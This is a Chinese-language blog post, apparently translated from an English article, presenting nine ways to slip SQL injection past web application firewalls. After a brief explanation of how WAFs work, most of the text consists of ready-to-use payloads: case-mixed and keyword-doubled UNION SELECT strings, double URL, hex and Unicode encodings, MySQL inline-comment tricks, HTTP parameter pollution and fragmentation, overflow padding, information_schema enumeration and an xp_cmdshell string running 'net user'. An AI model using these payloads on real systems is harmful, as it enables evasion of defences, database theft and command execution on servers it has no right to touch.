---
title: sql-injection-9-ways-bypass-web-application-firewall
date: 2018-03-08 15:54:24
tags:
		- Bypasswaf 
		-  翻译
		 
categories:
		- 翻译
---

SQL注入绕过`WAF`的几个技巧。

<!-- more -->


#### [翻译——sql-injection-9-ways-bypass-web-application-firewall](https://www.digitalmunition.me/2018/02/sql-injection-9-ways-bypass-web-application-firewall/)


Web应用程序(WAF)过滤，检测，拦截进出Web应用程序的`HTTP`流量。WAF不同于传统的防火墙，因为WAF能够过滤特定的Web应用程序内容，而传统防火墙只是充当服务器间的安全门。通过检测HTTP流量，它能拦截基于Web应用程序的漏洞，比如SQl注入、XSS、文件包含和安全误配置等攻击。

##### WAF工作原理

- 异常检测协议： 拦截不符合HTTP标准的请求
- 增强输入验证： 代理和服务器端验证。不只是客户端验证
- 基于白名单和黑名单 
- 基于规则和基于异常保护：基于规则的较固定，基于异常的比较灵活
- 状态管理：专注于会话保护，还有：Cookie保护、反入侵避免保护、响应监控和信息泄露保护

##### 如何绕过WAF

1. 大小写绕过。如果WAF区分大小写的话，`union`可以写为`UniOn`，更改大小写可能绕过该机制。(这种绕过已经很少见了，一般的WAF都会区分大小写的)

		http://target.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4

2. 替换关键字(插入被WAF删除的特殊字符)只是过滤关键字。比如过滤`script`，构造`scscriptript`变为`script`，把里面的`script`过滤后，剩余的字符拼接后也是`script`。

		http://target.com/index.php?page_id=-15&nbsp;UNIunionON SELselectECT 1,2,3,4


3. 编码绕过

	+ *URL encode*

			page.php?id=1%252f%252a*/UNION%252f%252a /SELECT

		经过双重解码后为

			page.php?id=1/**/UNION/* /SELECT

	+ *Hex encode*

			target.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…

			SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))

	+ *Unicode encode*

			?id=10%D6‘%20AND%201=2%23　　
 			SELECT 'Ä'='A'; #1

4.注释绕过

在攻击字符串中插入注释。比如`/*!select*/`可能会被`WAF`放行，但是传递给目标服务器能够被`mysql`数据库处理。

	index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4　　　
	 
	　　　'union%a0select pass from users#
	
	index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3
	 
	　　　?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…



5.等价函数和命令


有时候一些函数或者命令被过滤了，但是很多情况下可以使用等价或这相似的代码。

		hex()、bin() ==> ascii()
		 
		sleep() ==>benchmark()
		 
		concat_ws()==>group_concat()
		 substr((select 'password'),1,1) = 0x70
		 
		　　　strcmp(left('password',1), 0x69) = 1
		 
		　　   strcmp(left('password',1), 0x70) = 0
		 
		　　　strcmp(left('password',1), 0x71) = -1
		mid()、substr() ==> substring()
		 
		@@user ==> user()
		 
		@@datadir ==> datadir()


6.特殊符号。把非字母数字的符号规定为一个类为特殊符号。特殊符号具有特殊的含义和用法。



	+ ` symbol: select `version()`;
	+ +- :select+id-1+1.from users;
	+ @:select@^1.from users;
	+Mysql function() as xxx
	+`、~、!、@、%、()、[]、.、-、+ 、|、%00
	Example:
	‘se’+’lec’+’t’
	 
	　　　　　　%S%E%L%E%C%T 1
	 
	　　　　　　1.aspx?id=1;EXEC(‘ma’+'ster..x’+'p_cm’+'dsh’+'ell ”net user”’)
	
	' or --+2=- -!!!'2
	 
	 　　　 id=1+(UnI)(oN)+(SeL)(EcT)


7.HTTP参数污染

提供几个相同的参数来混淆`WAF`。比如以下的`url`

	 http://example.com?id=1&?id=’ or ‘1’=’1′ — ‘ 

在某些情况下，比如`Apache/PHP`，这个应用程序仅解析第二个`id`，但是`WAF`解析第一个，这似乎是一个合法的请求，但是应用程序仍然接受并处理恶意输入。现在的`WAF`大多数不容易受到参数污染的影响，但是仍然值得一试。

		/?id=1;select+1,2,3+from+users+where+id=1—
	 
	　　　/?id=1;select+1&amp;id=2,3+from+users+where+id=1—
	 
	　　　/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users


`HPP`也被称为重复参数污染。最简单的是`uid = 1 & uid = 2 & uid = 3`，对于这种情况，不同的`Web`服务处理情况如下：

![](https://i.imgur.com/tM8MPgW.png)


HPF(HTTP 参数 片段)

此方法是`HTTP`分段注入，与`CRLF`类似（使用控制字符 %0a，%0d等执行换行符）

	/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--
	 
	　　select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—
	

HPC(HTTP 参数污染)

RFC2396定义了以下字符：

	Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ' ()
	Reserved : ; / ? : @ &amp; = + $ ,
	Unwise : { } | \ ^ [ ] `


构建特殊请求时，不同的Web服务器处理进程具有不同的逻辑。

![](https://i.imgur.com/i0jbEHM.png)

在这种情况下，魔术字符`%`，在`Asp`和`Asp.net`中会受到影响。会把`%`吃掉，而正常执行攻击载荷。

![](https://i.imgur.com/TjKcPpb.png)

8.缓冲区溢出

毕竟`WAF`也是一个应用程序，容易受到和其他应用程序相同的软件缺陷的影响。如果一个缓冲区漏洞会导致崩溃，即使不会导致代码执行，这会导致`WAF`打开失败。换句话说，绕过了。


	?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26

9.集成整合绕过

一个绕过技术可能不能成功绕过，多个技巧结合起来可能或绕过。

	target.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 "A")..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…
	 
	id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -
	 
	?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--

总结，绕过`WAF`，终归还是寻找一个特性，经过`WAF`时不被拦截，但是后面的`Web`服务器可以正常执行。





